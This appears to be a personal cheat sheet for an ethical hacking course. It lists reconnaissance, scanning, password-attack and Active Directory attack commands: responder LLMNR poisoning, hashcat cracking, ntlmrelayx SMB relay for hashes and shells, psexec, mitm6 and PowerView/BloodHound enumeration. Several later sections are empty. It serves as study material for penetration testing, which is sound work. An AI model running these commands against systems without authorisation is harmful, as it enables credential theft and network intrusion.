# Practical_Ethical_Hacker_Cheatsheet
## Information Gathering (Reconnaissance)
### Discovering Email Addresses
  1. Ientify Emails with
        * hunter.io
        * phonebook.cz
        * Voilanorbert.com
        * clearbit Chrome Extension
    
  2. Verify the email
        * Verifyemailaddress.io
        * email-checker.net/validate
        * Check with password resets

### Discover Credentials with Dehashed
  1. Search for Breached Credentials with Dehashed.com
  2. if we find a hash we have search it on google or hashed.com to see if its cracked.

### Discover Subdomains
  1. Use sublist3r
  ```bash
  sublist3r -d <target.domain>
  ```
  2. Check crt.sh
  3. Use HTTPProbe to verify the subdomain is alive

### Discover Website Technologies
  1. Use builtwith.com
  2. Use the wappalyzer extension
  3. use whatweb
  ```bash
  whatweb <webpage>
  ```

### Utilizing Social Media
  1. Seach LinkedIn for employees, jobs, pictures
  2. From the employees, seach them on other platforms for information leakage
  3. If an organization has a lot of employees try the following password formats

      * \<Season>\<Year>\<Special Character>
      * \<CompanyName>\<Numbers>\<Special Character>
  
## Scanning and Enumeration
### Scanning for Alive Hosts
  ```shell
  netdiscover -r #{network}
  arp-scan -l
  ```
### Scanning with Nmap
#### Stealth Scan
  ```sh
  nmap -T4 -p- -A #{target} -oA TCP_Stealth_Scan
  ```
  ```sh
  nmap -sU -T4 ${target} -oA UDP_Scan
  ```
  
### Initial HTTP and HTTPS Enumeration
  1. If you see port 80 or 443 go to the website.
  2. Navigate the webpage to see if we can find the version of the server and the hostname
  3. Run a nikto scan
  ```sh
  nikto -h #{target} > nikto_scan.txt
  ```
  5. Enumerate directories start with the small directory list and escalate if nothing is found.
  ```sh
  dirbuster&
  ```
  6. View the source code for comments such as credentials and keys
  7. Intercept traffic with burp suite for information disclosure
  8. Check Wappalyzer

### Enumerating SMB
  1. Find the smb version
  * You can enumerate with metasploit module = auxiliary/scanner/smb/smb_version
  2. Enumerate the Shares
  ```sh
  smbclient -L \\\\#{target}\\
  ```
  ```sh
  smbclient \\\\<#{target}\\${share}
  ```

### Enumerating SSH
  1. Get the SSH version from nmap
  2. Attempt to SSH
  ```sh
  ssh #{target}
  ```
  If we get a "no matching key exchange method found" error add it with:
  ```sh
  ssh #{target} -oKexAlgorithms=+#{key_exchange}
  ```
  If we then get a "no cipher found add it:
  ```sh
  ssh #{target} -oKexAlgorithms=+#{key_exchange} -c #{cipher>
  ```
### Research Possible Vulnerabilities
  1. Search the versions + exploits in google and searchsploit
  2. If there is something found, it is worth noting down
  3. After all potential vulnerabilities are found try them to see what works.

## Vulnerability Scanning
### Scanning with Nessus
  1. Settings to use
    * Select Targets
    * Set up the email
    * Discovery > Scan type: Port Scan (All Ports)
    * Assessment > Scan Type: Known Web Vulnerabilities

### Scanning with Nmap
  ```sh
  nmap -T4 -p- -a --script vuln #{target}
  ```

## Exploitation Basics
### Basic Password Attacks
#### Metasploit
  1. Search for protocol log in script
  2. Set it up
  3. run it

#### Hydra
  ```sh
  hydra -l/-L ${user/User_list} -p/-P ${pass/pass_list} #{protocol}//#{target} -t #{threads} 
  ```

### Credential Stuffing
  1. if we have breached credentials we can use them against the target.
  2. Open Burp Suite to capture the traffic of a log in
  3. Set up intruder to change the username and password
  4. Run the attack and stop it
  5. Grep for an error code
  6. Rerun the attack and sort by the grep
  
  Note: Weak Password Policies could come into play attempt passwords with:
    * ${season}${year}${special character}
    * ${company}{special character}
    * Password123 
    * Password1!
    
## Attacking AD: Initial Attack Vectors
### LLMNR Poisoning
  1. Run responder and get hashes
  ```sh
  responder -I ${interface} -dwv
  ```
  2. Copy the hash
  3. Attempt to crack the hash with hashcat
  ```powershell
  .\hashcat -m 5600 .\ntlmhash.txt .\rockyou.txt -O
  ```
### SMB Relay Attacks
  1. Discover what hosts have SMB signing Disabled on either Nessus or Nmap.
  ```sh
  nmap --script=smb2-security-mode.nse -p445 #{network}
  ```
  2. Make a list of targets that have message signing enabled and not required or disabled.
  3. Change Responder.conf and change two lines: SMB = Off and HTTP = Off
  4. Start responder
   ```sh
  responder -I ${interface} -dwv
  ```
  4. Start ntlmrelayx and obtain SAM Hashes
  ```sh
  ntlmrelayx.py -tf targets.txt -smb2support
  ```
  5. Start ntlmrelayx and obtain an interactive shell
  ```sh
  ntlmrelayx.py -tf targets.txt -smb2support -i
  ```
  6. Connect to the shell
  ```sh
  nc 127.0.0.1 11000
  ```

### Gain Shell Access
  1. Try psexec in metasploit: use exploit/windows/smb/psexec or psexec_psh it is worth trying with different targets.
  2. Try psexec.py
  ```sh
  psexec.py <domain>/<username>:<Password>@<target>
  ```
  3. Try wmiexec.py
  ```sh
  wmiexec.py <domain>/<username>:<Password>@<target>
  ```
  4. Try smbexec.py
  ```sh
  smbexec.py <domain>/<username>:<Password>@<target>
  ```
### IPv6 Attacks
#### IPv6 DNS Takeover
 1. Set up mitm6
 ```sh
 mitm6 -d <target.domain>
  ```
 2. Set up ntlmrelayx
 ```sh
 ntlmrelayx.py -6 -t ldaps://<DC_IP> -wh fakewpad.<target.domain> -l Domain_Enum
 ```
 3. Review the Domain_Enum Folder and view if users were created.

### Strategies
  1. Start with mitm6 or Responder
  2. Run scans to generate traffic
  3. scan for websites in scope (http_version)
  4. Look for default Credentials on
    * Printers
    * Jenkings
    * Etc
  5. Think Outside Box   

## Attacking AD: Post-Compromise Enumeration
### Domain Enumeration with Powerview
  1. Transfer PowerView.ps1 to the compromised machine
  2. start powershell and use PowerView.ps1
  ```cmd
  powershell -ep bypass
  . .\PowerView.ps1
  ```
  3. Perform Enumeration
  ```powershell
  Get-NetDOmain
  Get-NetDomainController
  Get-DomainPolicy
  (Get-DomainPolicy)."system access"
  Get-NetUser
  Get-NetUser | select cn
  Get-NetUser | select samusername
  Get-NetUser | select description
  Get-UserProperty -Properties pwdlastset
  Get-UserProperty -Properties logoncount
  Get-UserProperty -Properties badpwdcount
  Get-NetComputer
  Get-NetComputer -FullData
  Get-NetComputer -FullData | select OperatingSystem
  Get-NetGroup
  Get-NetGroup -GroupName "Domain Admins"
  Get-NetGroup -GroupName *admin*
  Get-NetGroupMember -GroupName "Domain Admins"
  Invoke-ShareFinder
  Get-NetGPO
  Get-NetGPO | select displayname, whenchanged
  ```
  
### Domain Enumeration with Bloodhound
  1. Start bloodhound
  ```sh
  neo4j&
  bloodhound&
  ```
  2. Get SharpHound.ps1 on a compromised asset.
  3. Start Powershell and collect the data
  ```powershell
  powershell -ep bypass
  . .\SharpHound.ps1
  Invoke-BloodHound -CollectionMethod All -Domain <domain.local> -ZipFIleName file.zip
  ```
  4. Transfer the data into BloodHound
  5. Analyze the data in queries
        *  Find all Domain Admins
        *  Find Shortest Path to Domain Admins
        *  Shortest path to Kerberoastable Users

## Attacking AD: Post-Compromise Attacks
### Pass the password with Crackmapexec

### Dump Hashes with secretsdump.py
### Token Impersonation
### kerberoasting
### Abusing GPP

## ZeroLogon

## Post Exploitation
### File Transfers
### 

## Web Application Enumeration, Revisited
## Testing the Top 10 Web Application Vulnerabilities
## Wireless Penetration Testing

